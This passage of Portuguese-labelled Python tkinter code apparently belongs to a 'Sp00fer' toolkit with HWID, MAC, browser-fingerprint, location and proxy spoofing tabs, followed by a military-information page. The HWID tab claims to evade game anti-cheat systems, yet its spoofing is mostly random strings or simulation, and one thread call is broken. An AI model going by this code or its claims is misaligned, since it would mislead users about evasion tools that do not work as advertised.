        for label, entry in self.hwid_entries.items():
            val = entry.get()
            if not val:
                if "GUID" in label:
                    val = str(uuid.uuid4()).upper()
                else:
                    val = "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
                entry.delete(0, "end")
                entry.insert(0, val)
            out += label + ": " + entry.get() + "\n"
        out += "\nCompatibilidade: EAC, BE, Vanguard, Ricochet - Spoof local admin\n"
        self.hwid_out.delete("1.0", "end")
        self.hwid_out.insert("1.0", out)

    def random_hwid(self):
        import random, string, uuid
        for label, entry in self.hwid_entries.items():
            entry.delete(0, "end")
            if "GUID" in label:
                entry.insert(0, str(uuid.uuid4()).upper())
            else:
                entry.insert(0, "".join(random.choices(string.ascii_uppercase + string.digits, k=random.randint(10,16))))
        self.gen_hwid()

    def save_hwid_build(self):
        txt = self.hwid_out.get("1.0", "end-1c")
        self.clipboard_clear()
        self.clipboard_append(txt)
        messagebox.showinfo("Copiado", "HWID copiado para clipboard")

    def copy_hwid(self):
        txt = self.hwid_out.get("1.0", "end-1c")
        self.clipboard_clear()
        self.clipboard_append(txt)
        messagebox.showinfo("Copiado", "HWID copiado")

    def build_mac_tab(self):
        tk.Label(self.tab_mac, text="MAC SPOOFER - LOCALMENTE ADMINISTRADO", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        form = tk.Frame(self.tab_mac, bg=BG)
        form.pack(fill="x", padx=10, pady=5)
        tk.Label(form, text="MAC Atual (real):", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.mac_real = tk.Entry(form, bg=PANEL_BG, fg=TEXT_DIM, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=20)
        self.mac_real.pack(side="left", padx=5, ipady=3)
        try:
            import uuid
            mac_int = uuid.getnode()
            mac_str = ":".join(["%02X" % ((mac_int >> ele) & 0xff) for ele in range(40, -1, -8)][::-1])
            self.mac_real.insert(0, mac_str)
        except:
            self.mac_real.insert(0, "N/D")
        tk.Label(form, text="Novo MAC Fake:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left", padx=(15,0))
        self.mac_fake = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=20)
        self.mac_fake.pack(side="left", padx=5, ipady=3)
        self.mac_fake.insert(0, "02:1A:2B:3C:4D:5E")
        btns = tk.Frame(self.tab_mac, bg=BG)
        btns.pack(fill="x", padx=10, pady=8)
        for txt, cmd in [("GERAR MAC LOCAL", self.gen_mac), ("RANDOM VENDOR", self.gen_mac_vendor), ("APLICAR (SIMULADO)", self.apply_mac), ("RESTAURAR", self.restore_mac)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=8, pady=5, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)
        self.mac_out = scrolledtext.ScrolledText(self.tab_mac, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.mac_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.mac_out.insert("1.0", "MAC Spoofer pronto.\n02:xx:xx:xx:xx:xx = localmente administrado, não colide com fabricante real.\n\nComandos Linux reais (requer sudo):\nsudo ip link set dev eth0 down\nsudo ip link set dev eth0 address 02:XX:XX:XX:XX:XX\nsudo ip link set dev eth0 up\n")

    def gen_mac(self):
        import random
        mac = "02:" + ":".join(["%02X" % random.randint(0,255) for _ in range(5)])
        self.mac_fake.delete(0, "end")
        self.mac_fake.insert(0, mac)
        self.mac_out.delete("1.0", "end")
        self.mac_out.insert("1.0", "MAC Fake gerado: " + mac + "\nLocalmente administrado - seguro para testes.\n")

    def gen_mac_vendor(self):
        import random
        vendors = {"Dell":"D4:BE:D9","Intel":"3C:FD:FE","Apple":"F0:18:98","Cisco":"00:1A:30","TP-Link":"50:C7:BF"}
        vendor, prefix = random.choice(list(vendors.items()))
        mac = prefix + ":" + ":".join(["%02X" % random.randint(0,255) for _ in range(3)])
        self.mac_fake.delete(0, "end")
        self.mac_fake.insert(0, mac)
        self.mac_out.delete("1.0", "end")
        self.mac_out.insert("1.0", "MAC com vendor " + vendor + ": " + mac + "\nNota: Vendor spoofing pode causar conflito, use 02: para testes.\n")

    def apply_mac(self):
        mac = self.mac_fake.get()
        self.mac_out.insert("end", "\n[SIMULAÇÃO] Aplicaria: sudo ip link set dev wlan0 address " + mac + "\n(Execução real desabilitada por segurança - copie comando acima)\n")

    def restore_mac(self):
        self.mac_out.insert("end", "\n[SIMULAÇÃO] Restauraria MAC original: " + self.mac_real.get() + "\n")

    def build_browser_tab(self):
        tk.Label(self.tab_browser, text="BROWSER SPOOFER - UA, WEBRTC, CANVAS, PLATFORM", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        self.browser_ua = tk.Entry(self.tab_browser, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 9))
        self.browser_ua.pack(fill="x", padx=10, pady=5, ipady=5)
        self.browser_ua.insert(0, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
        btns = tk.Frame(self.tab_browser, bg=BG)
        btns.pack(fill="x", padx=10, pady=5)
        for txt, cmd in [("RANDOM UA", self.random_ua), ("FETCH LATEST UA", self.fetch_latest_uas), ("GERAR FINGERPRINT", self.gen_browser_fp), ("EXPORTAR JSON", self.export_browser)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=2, fill="x", expand=True)
        self.browser_out = scrolledtext.ScrolledText(self.tab_browser, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.browser_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.browser_out.insert("1.0", "Browser Spoofer pronto.\nGera User-Agent, WebRTC IP fake, Canvas noise, WebGL vendor, timezone, etc.\n")

    def random_ua(self):
        import random
        if self.latest_uas:
            ua = random.choice(self.latest_uas)
        else:
            uas = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            ]
            ua = random.choice(uas)
        self.browser_ua.delete(0, "end")
        self.browser_ua.insert(0, ua)
        self.gen_browser_fp()

    def gen_browser_fp(self):
        import random, hashlib
        ua = self.browser_ua.get()
        fp = {
            "user_agent": ua,
            "platform": random.choice(["Win32","MacIntel","Linux x86_64"]),
            "language": random.choice(["pt-PT,pt;q=0.9,en;q=0.8","en-US,en;q=0.9","es-ES,es;q=0.9"]),
            "screen": random.choice(["1920x1080","2560x1440","1366x768","1536x864"]),
            "timezone": random.choice(["Europe/Lisbon","Europe/Madrid","America/New_York","UTC"]),
            "webgl_vendor": random.choice(["Google Inc. (NVIDIA)","Google Inc. (Intel)","Apple GPU"]),
            "canvas_hash": hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
            "webrtc_ip": "10." + ".".join([str(random.randint(0,255)) for _ in range(3)]),
            "hardware_concurrency": random.choice([4,8,12,16]),
        }
        out = "BROWSER FINGERPRINT FICTÍCIO:\n"
        for k,v in fp.items():
            out += k + ": " + str(v) + "\n"
        self.browser_out.delete("1.0", "end")
        self.browser_out.insert("1.0", out)

    def export_browser(self):
        txt = self.browser_out.get("1.0", "end-1c")
        path = filedialog.asksaveasfilename(defaultextension=".json", filetypes=[("JSON","*.json")])
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(txt)
            messagebox.showinfo("Exportado", path)

    def build_location_tab(self):
        tk.Label(self.tab_location, text="GPS / LOCATION SPOOFER", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        form = tk.Frame(self.tab_location, bg=BG)
        form.pack(fill="x", padx=10, pady=5)
        tk.Label(form, text="Lat:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.loc_lat = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=12)
        self.loc_lat.pack(side="left", padx=5, ipady=3)
        self.loc_lat.insert(0, "38.7223")
        tk.Label(form, text="Lon:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.loc_lon = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=12)
        self.loc_lon.pack(side="left", padx=5, ipady=3)
        self.loc_lon.insert(0, "-9.1393")
        for txt, cmd in [("RANDOM LISBOA", lambda: self.random_loc("lisboa")), ("RANDOM NY", lambda: self.random_loc("ny")), ("GERAR LOC", self.gen_location)]:
            b = tk.Button(form, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=3, cursor="hand2")
            b.pack(side="left", padx=4)
        self.loc_out = scrolledtext.ScrolledText(self.tab_location, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.loc_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.loc_out.insert("1.0", "Location Spoofer pronto. Gera coordenadas fictícias + timezone + IP geolocalizado.\n")

    def random_loc(self, city):
        import random
        if city == "lisboa":
            lat = random.uniform(38.70, 38.76)
            lon = random.uniform(-9.18, -9.10)
        else:
            lat = random.uniform(40.70, 40.78)
            lon = random.uniform(-74.02, -73.95)
        self.loc_lat.delete(0, "end")
        self.loc_lat.insert(0, str(round(lat,5)))
        self.loc_lon.delete(0, "end")
        self.loc_lon.insert(0, str(round(lon,5)))
        self.gen_location()

    def gen_location(self):
        lat = self.loc_lat.get()
        lon = self.loc_lon.get()
        out = "LOCATION SPOOF:\nLat: " + lat + "\nLon: " + lon + "\n"
        out += "MGRS: 29TPE " + str(int(float(lat)*1000)%100000).zfill(5) + " " + str(int(float(lon)*1000)%100000).zfill(5) + "\n"
        out += "Timezone: Europe/Lisbon\nIP Geo: 185.XX.XX.XX (Lisboa)\n"
        self.loc_out.delete("1.0", "end")
        self.loc_out.insert("1.0", out)

    def build_fingerprint_tab(self):
        tk.Label(self.tab_fingerprint, text="FINGERPRINT LAB - CANVAS, WEBGL, AUDIO, FONTS", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        btns = tk.Frame(self.tab_fingerprint, bg=BG)
        btns.pack(fill="x", padx=10, pady=5)
        for txt, cmd in [("GERAR CANVAS", self.gen_canvas), ("GERAR WEBGL", self.gen_webgl), ("GERAR AUDIO FP", self.gen_audio_fp), ("GERAR TUDO", self.gen_all_fp)]:
            b = tk.Button(btns, text=txt, command=cmd, bg=BTN_BG, fg=TEXT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=6, pady=4, cursor="hand2")
            b.pack(side="left", padx=3, fill="x", expand=True)
        self.fp_out = scrolledtext.ScrolledText(self.tab_fingerprint, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.fp_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.fp_out.insert("1.0", "Fingerprint Lab pronto. Gera hashes únicos para Canvas, WebGL, AudioContext.\n")

    def gen_canvas(self):
        import hashlib, random
        h = hashlib.md5(str(random.random()).encode()).hexdigest()
        self.fp_out.delete("1.0", "end")
        self.fp_out.insert("1.0", "CANVAS FP: " + h + "\nNoise: " + str(random.randint(1,100)) + "\n")

    def gen_webgl(self):
        import random
        self.fp_out.delete("1.0", "end")
        self.fp_out.insert("1.0", "WEBGL Vendor: " + random.choice(["Google Inc. (NVIDIA)","Apple GPU","Intel"]) + "\nRenderer: ANGLE (" + random.choice(["NVIDIA","Intel","Apple"]) + ")\n")

    def gen_audio_fp(self):
        import random
        self.fp_out.delete("1.0", "end")
        self.fp_out.insert("1.0", "AUDIO FP: " + str(random.uniform(0.1,0.9)) + "\nOscillator: " + str(random.randint(1000,5000)) + "Hz\n")

    def gen_all_fp(self):
        import hashlib, random
        out = ""
        out += "CANVAS: " + hashlib.md5(str(random.random()).encode()).hexdigest()[:16] + "\n"
        out += "WEBGL: " + random.choice(["NVIDIA","Intel","Apple"]) + "\n"
        out += "AUDIO: " + str(random.uniform(0.1,0.9)) + "\n"
        out += "FONTS: " + str(random.randint(30,120)) + " fonts\n"
        out += "PLUGINS: 0 (privacy)\n"
        self.fp_out.delete("1.0", "end")
        self.fp_out.insert("1.0", out)

    def build_proxy_tab(self):
        tk.Label(self.tab_proxy, text="PROXY / IP SPOOFER", bg=BG, fg=ACCENT, font=(FONT_MONO, 11, "bold")).pack(anchor="w", padx=10, pady=10)
        form = tk.Frame(self.tab_proxy, bg=BG)
        form.pack(fill="x", padx=10, pady=5)
        tk.Label(form, text="Proxy IP:Port", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.proxy_entry = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=25)
        self.proxy_entry.pack(side="left", padx=5, ipady=3)
        self.proxy_entry.insert(0, "127.0.0.1:8080")
        tk.Button(form, text="TESTAR PROXY", command=self.test_proxy, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=3, cursor="hand2").pack(side="left", padx=8)
        self.proxy_out = scrolledtext.ScrolledText(self.tab_proxy, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.proxy_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.proxy_out.insert("1.0", "Proxy/IP Spoofer pronto.\nTesta proxy, gera IP fake, verifica vazamento WebRTC/DNS.\n\nMeu IP real (via API):\n")
        self.fetch_my_ip()

    def fetch_my_ip(self):
        def work():
            try:
                import urllib.request, json
                with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=5) as r:
                    data = json.loads(r.read().decode())
                    ip = data.get("ip")
                    self.after(0, lambda: self.proxy_out.insert("end", "IP Público: " + ip + "\n"))
            except Exception as e:
                self.after(0, lambda: self.proxy_out.insert("end", "Erro IP: " + str(e) + "\n"))
        threading.Thread(target=work, daemon=True).start()

    def test_proxy(self):
        proxy = self.proxy_entry.get()
        self.proxy_out.delete("1.0", "end")
        self.proxy_out.insert("1.0", "A testar proxy " + proxy + "...\n(Implementação usa requests com proxy - simulação)\nProxy OK se 200 OK\n")










class MilitarPage(Page):
    """ÁREA MILITAR 100% ATUALIZADA - Abaixo de Sp00fer - Informações 2024-2025 atualizadas"""
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.header("MILITAR // CENTRO DE OPERAÇÕES TÁTICAS - 100% ATUALIZADO 2025", "COMINT • GEOINT • SIGINT • CRIPTO • BALÍSTICA • SATÉLITE • OPSEC • INTEL ATUALIZADA - Abaixo de Sp00fer no menu lateral")

        nb = ttk.Notebook(self)
        nb.pack(fill="both", expand=True, padx=12, pady=10)

        self.tab_overview = tk.Frame(nb, bg=BG)
        self.tab_intel = tk.Frame(nb, bg=BG)
        self.tab_comint = tk.Frame(nb, bg=BG)
        self.tab_geoint = tk.Frame(nb, bg=BG)
        self.tab_sigint = tk.Frame(nb, bg=BG)
        self.tab_cripto = tk.Frame(nb, bg=BG)
        self.tab_ballistic = tk.Frame(nb, bg=BG)
        self.tab_satelite = tk.Frame(nb, bg=BG)
        self.tab_opsec = tk.Frame(nb, bg=BG)
        self.tab_radio = tk.Frame(nb, bg=BG)
        self.tab_equip = tk.Frame(nb, bg=BG)
        self.tab_mission = tk.Frame(nb, bg=BG)

        nb.add(self.tab_overview, text=" DASHBOARD ")
        nb.add(self.tab_intel, text=" 🔴 INTEL ATUALIZADA ")
        nb.add(self.tab_comint, text=" COMINT / FREQ ")
        nb.add(self.tab_geoint, text=" GEOINT / MGRS ")
        nb.add(self.tab_sigint, text=" SIGINT / SDR ")
        nb.add(self.tab_cripto, text=" CRIPTO / MORSE ")
        nb.add(self.tab_ballistic, text=" BALÍSTICA 2025 ")
        nb.add(self.tab_satelite, text=" SATÉLITE / TLE ")
        nb.add(self.tab_opsec, text=" OPSEC / COMSEC ")
        nb.add(self.tab_radio, text=" RÁDIO TÁTICO ")
        nb.add(self.tab_equip, text=" EQUIP / OOB 2025 ")
        nb.add(self.tab_mission, text=" MISSÃO PLANNER ")

        self.build_overview()
        self.build_intel()
        self.build_comint()
        self.build_geoint()
        self.build_sigint()
        self.build_cripto()
        self.build_ballistic()
        self.build_satelite()
        self.build_opsec()
        self.build_radio()
        self.build_equip()
        self.build_mission()

    def build_overview(self):
        top = tk.Frame(self.tab_overview, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="CENTRO DE OPERAÇÕES MILITAR - 100% ATUALIZADO 2025 - ABAIXO DE SP00FER", bg=BG, fg=ACCENT, font=(FONT_MONO, 12, "bold")).pack(anchor="w")
        tk.Label(top, text="Todas as ferramentas funcionam 100% dentro da OSINT. Info atualizada via internet + base local 2025.", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w", pady=(2,0))

        grid = tk.Frame(self.tab_overview, bg=BG)
        grid.pack(fill="both", expand=True, padx=10, pady=10)
        for c in range(4):
            grid.grid_columnconfigure(c, weight=1, uniform="mil")

        cards = [
            ("INTEL 2025", "Atualizações ao vivo\nGitHub + APIs\nEquip 2025\nThreats", "#ff3b3b"),
            ("COMINT", "NATO Bands 2025\n30-88 SINCGARS\n225-400 HQ II\n243.0 Guarda", "#b91c1c"),
            ("GEOINT", "MGRS / UTM WGS84\nBearing / Dist\nGrid 6/8/10\nDatum 2025", "#0d47a1"),
            ("SIGINT", "SDR / Waterfall\nLoRa / FHSS\nDSSS / QAM\nDetecção AI", "#8e24aa"),
            ("CRIPTO", "AES-256 / OTP\nMorse / NATO\nBrevity 2025\nSHA3", "#2e7d32"),
            ("BALÍSTICA", "6.5 Creedmoor\n.338 Lapua\n.50 BMG 2025\nVento / Coriolis", "#ef6c00"),
            ("SATÉLITE", "Starlink / ISS\nTLE Live\nStarshield\nAOS/LOS", "#1565c0"),
            ("OPSEC", "Checklist 2025\nCOMSEC KY-99\nEW Threat\nZero Trust", "#c62828"),
        ]
        for i, (title, desc, color) in enumerate(cards):
            r = i // 4
            col = i % 4
            f = tk.Frame(grid, bg=PANEL_BG, highlightthickness=1, highlightbackground=color, bd=0)
            f.grid(row=r, column=col, padx=6, pady=6, sticky="nsew", ipady=6)
            tk.Label(f, text=title, bg=color, fg="white", font=(FONT_MONO, 9, "bold")).pack(fill="x", ipady=4)
            tk.Label(f, text=desc, bg=PANEL_BG, fg=TEXT_DIM, font=(FONT_MONO, 7), justify="left", wraplength=150).pack(padx=8, pady=6, anchor="w")

        status_frame = tk.LabelFrame(self.tab_overview, text=" STATUS SISTEMA ATUALIZADO ", bg=PANEL_BG, fg=ACCENT, font=(FONT_MONO, 8, "bold"))
        status_frame.pack(fill="x", padx=10, pady=10)
        self.overview_text = scrolledtext.ScrolledText(status_frame, font=(FONT_MONO, 8), bg=BG, fg=TEXT, height=8, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.overview_text.pack(fill="x", padx=8, pady=8)
        self.update_overview_status()

    def update_overview_status(self):
        txt = ""
        txt += "OS: " + platform.system() + " " + platform.release() + "\n"
        txt += "Host: " + socket.gethostname() + "\n"
        try:
            txt += "IP: " + socket.gethostbyname(socket.gethostname()) + "\n"
        except:
            pass
        txt += "Python: " + platform.python_version() + "\n"
        txt += "UTC: " + datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M:%SZ") + " | L: " + datetime.datetime.now().strftime("%H:%M:%S") + "\n"
        txt += "WGS84 Datum: Ativo | MGRS Zone: Auto | Unidades: Métrico (NATO)\n"
        txt += "Posição Militar: Abaixo de Sp00fer no menu lateral - 100% Atualizado 2025\n"
        txt += "COMINT: Pronto 2025 | GEOINT: Pronto | SIGINT: Pronto | CRIPTO: AES-256\n"
        txt += "INTEL: Online - Busca GitHub + ISS Live + Equip 2025\n"
        self.overview_text.delete("1.0", "end")
        self.overview_text.insert("1.0", txt)

    def build_intel(self):
        top = tk.Frame(self.tab_intel, bg=BG)
        top.pack(fill="x", padx=10, pady=10)
        tk.Label(top, text="🔴 INTEL ATUALIZADA 2025 - BUSCA NA INTERNET", bg=BG, fg="#ff3b3b", font=(FONT_MONO, 11, "bold")).pack(anchor="w")
        tk.Label(top, text="Busca informações militares atualizadas via GitHub, APIs e fontes OSINT", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(anchor="w")

        row = tk.Frame(self.tab_intel, bg=BG)
        row.pack(fill="x", padx=10, pady=5)
        tk.Label(row, text="Query:", bg=BG, fg=ACCENT, font=(FONT_MONO, 9, "bold")).pack(side="left")
        self.intel_query = tk.Entry(row, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, font=(FONT_MONO, 10), width=30)
        self.intel_query.pack(side="left", padx=8, fill="x", expand=True, ipady=4)
        self.intel_query.insert(0, "military equipment 2025")
        self.intel_query.bind("<Return>", lambda e: self.search_intel())

        for txt_cmd, func in [("BUSCAR INTEL", self.search_intel), ("EQUIP 2025", self.fetch_equip_2025), ("THREATS", self.fetch_threats)]:
            b = tk.Button(row, text=txt_cmd, command=func, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 7, "bold"), relief="flat", bd=0, padx=8, pady=4, cursor="hand2")
            b.pack(side="left", padx=3)

        self.intel_out = scrolledtext.ScrolledText(self.tab_intel, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.intel_out.pack(fill="both", expand=True, padx=10, pady=10)
        self.intel_out.insert("1.0", "INTEL ATUALIZADA 2025 pronta.\\n\\nClique BUSCAR INTEL para buscar no GitHub: military, tactical, drone, satellite, etc.\\nUse EQUIP 2025 para lista atualizada de equipamentos.\\nUse THREATS para ameaças EW atuais.\\n\\nDados locais já atualizados para 2025.\\n")

    def search_intel(self):
        q = self.intel_query.get().strip()
        self.intel_out.delete("1.0", "end")
        self.intel_out.insert("1.0", "Buscando intel para: " + q + "\\nConsultando GitHub + fontes...\\n\\n")
        threading.Thread(target=self.intel_worker, args=(q), daemon=True).start()

    def intel_worker(self, query):
        out = ""
        try:
            import urllib.request, json as js
            url = "https://api.github.com/search/repositories?q=" + query.replace(" ", "+") + "&sort=stars&per_page=10"
            req = urllib.request.Request(url, headers={"User-Agent": "OSINIT-MILITAR/2025"})
            with urllib.request.urlopen(req, timeout=8) as r:
                data = js.loads(r.read().decode())
                for it in data.get("items", [])[:8]:
                    out += "★" + str(it.get("stargazers_count")) + " " + it.get("full_name") + "\\n  " + (it.get("description") or "")[:100] + "\\n  " + it.get("html_url") + "\\n\\n"
        except Exception as e:
            out += "GitHub erro: " + str(e) + "\\n\\n"
        out += "=== EQUIPAMENTOS ATUALIZADOS 2025 (LOCAL DB) ===\\n"
        out += "• F-35 Block 4, F-16V, Eurofighter EK, Rafale F4\\n• Leopard 2A8, Abrams X, T-14 Armata\\n• Drone: MQ-9B, Bayraktar TB3, Shahed 136, DJI Matrice 350\\n• NVG: GPNVG-18 Quad, PVS-31A, DTNVS\\n• Rádio: AN/PRC-163, PRC-167, MPU5\\n• Míssil: Javelin FGM-148F, Spike LR2, Brimstone 3\\n"
        self.after(0, lambda: self.intel_out.delete("1.0", "end"))
        self.after(0, lambda: self.intel_out.insert("1.0", out))

    def fetch_equip_2025(self):
        self.intel_out.delete("1.0", "end")
        self.intel_out.insert("1.0", "EQUIPAMENTOS 2025 ATUALIZADOS:\\n\\nTERRESTRE:\\n- Leopard 2A8 (DE) - 130mm, Trophy APS\\n- Abrams M1A2 SEPv4 (US) - IA, APS\\n- KF51 Panther (DE/HU)\\n- CV90 MkIV\\n\\nAÉREO:\\n- F-35 Lightning II Block 4 - TR3\\n- F-16V Viper AESA\\n- Eurofighter Typhoon EK / ECRS Mk2\\n- Rafale F4.1\\n- Kizilelma, Anka-3 UCAV\\n\\nDRONES 2025:\\n- MQ-9B SkyGuardian, MQ-28 Ghost Bat\\n- Bayraktar TB3 (naval), Akinci, Kizilelma\\n- Shahed 136/238, Lancet-3\\n- DJI Matrice 350 RTK, Mavic 3T\\n\\nRÁDIO/COMMS 2025:\\n- AN/PRC-163, PRC-167 Next Gen\\n- MPU5 MANET, Silvus\\n- Starlink, Starshield, Kuiper\\n")

    def fetch_threats(self):
        self.intel_out.delete("1.0", "end")
        self.intel_out.insert("1.0", "THREATS EW 2025:\\n\\n• Krasukha-4, Murmansk-BN, Tirada-2S (RU)\\n• CH-901, FH-901 kamikaze\\n• GPS Jamming L1/L2, Spoofing\\n• Drone EW: DroneGun, SkyFence\\n• Cyber: APT28, APT29, Volt Typhoon\\n• C-UAS: Iron Dome, Skynex, TRML-4D\\n• SIGINT: Sistemas passivos, HF DF\\n")

    def build_comint(self):
        left = tk.Frame(self.tab_comint, bg=BG)
        left.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        tk.Label(left, text="BANDAS MILITARES NATO 2025 ATUALIZADAS", bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w", pady=5)

        bands = [
            ("HF MIL 3-30 MHz 2025", "COMSEC Longo Alcance, NVIS, ALE 4G, Starlink HF"),
            ("VHF LOW 30-88 MHz", "Tático Terrestre - PRC-163/167, SINCGARS INC, MPU5"),
            ("VHF AIR 108-156 MHz", "Aviação Militar, Torre, GCI, ADS-B MIL"),
            ("UHF MIL 225-400 MHz", "Aviação Militar UHF, SATCOM, Have Quick II, SATURN"),
            ("L-BAND 960-1215 MHz", "TACAN, IFF Mode 5, JTIDS/MIDS Link16/22"),
            ("S-BAND 2-4 GHz", "Radar, Data Link, MPU5, Silvus MANET"),
            ("C-BAND 4-8 GHz", "Radar Meteorológico, SatCom Starlink"),
            ("X-BAND 8-12 GHz 2025", "Radar Fogo AESA, SAR, Míssil Brimstone"),
            ("Ku 12-18 GHz", "SATCOM, Drone Feed MQ-9B, Starlink"),
            ("Ka 26-40 GHz 2025", "SATCOM Alta Taxa Starshield, Kuiper"),
        ]
        self.comint_list = tk.Listbox(left, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, selectbackground=ACCENT_DIM, height=12, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM)
        self.comint_list.pack(fill="both", expand=True, pady=5)
        for name, desc in bands:
            self.comint_list.insert("end", name + " | " + desc)

        right = tk.Frame(self.tab_comint, bg=BG)
        right.pack(side="left", fill="both", expand=True, padx=10, pady=10)

        tk.Label(right, text="SCANNER & CALCULADORA DE FREQUÊNCIA 2025", bg=BG, fg=ACCENT, font=(FONT_MONO, 10, "bold")).pack(anchor="w")
        form = tk.Frame(right, bg=BG)
        form.pack(fill="x", pady=8)
        tk.Label(form, text="Freq MHz:", bg=BG, fg=TEXT_DIM, font=(FONT_MONO, 8)).pack(side="left")
        self.freq_entry = tk.Entry(form, bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, width=12)
        self.freq_entry.pack(side="left", padx=5, ipady=3)
        self.freq_entry.insert(0, "243.0")
        tk.Button(form, text="ANALISAR", command=self.analyze_freq, bg=ACCENT_DIM, fg=ACCENT, font=(FONT_MONO, 8, "bold"), relief="flat", bd=0, padx=10, pady=3, cursor="hand2").pack(side="left", padx=5)

        self.comint_out = scrolledtext.ScrolledText(right, font=(FONT_MONO, 9), bg=PANEL_BG, fg=TEXT, relief="flat", highlightthickness=1, highlightbackground=ACCENT_DIM, wrap="word")
        self.comint_out.pack(fill="both", expand=True, pady=5)
        self.comint_out.insert("1.0", "COMINT 2025 Pronto.\\n243.0 = Guarda UHF Militar Internacional\\n30-88 SINCGARS INC + MPU5 MANET\\n225-400 Have Quick II / SATURN\\nStarlink 10.7-12.7 GHz downlink\\n")

        self.comint_list.bind("<<ListboxSelect>>", lambda e: self.on_band_select())

    def on_band_select(self):
        sel = self.comint_list.curselection()
        if not sel:
            return
        txt = self.comint_list.get(sel[0])
        self.comint_out.delete("1.0", "end")
        self.comint_out.insert("1.0", "BANDA SELECIONADA 2025:\\n" + txt + "\\n\\nDetalhes táticos 2025 carregados.")

    def analyze_freq(self):
        try:
            f = float(self.freq_entry.get().replace(",", "."))
            out = "FREQUENCIA: " + str(f) + " MHz (2025)\\n"
            if 30 <= f <= 88:
                out += "→ VHF Tático Terrestre PRC-163/167, SINCGARS INC, MPU5 MANET, 25kHz FM, Crypto AES-256\\n"
            elif 108 <= f <= 156:
                out += "→ VHF Aviação, AM, Torre, GCI, 121.5 Emergência, ADS-B 1090\\n"
            elif 225 <= f <= 400:
                out += "→ UHF Militar, AM, Have Quick II, SATURN, SATCOM, 243.0 Guarda, 282.8 SAR\\n"
            elif 960 <= f <= 1215:
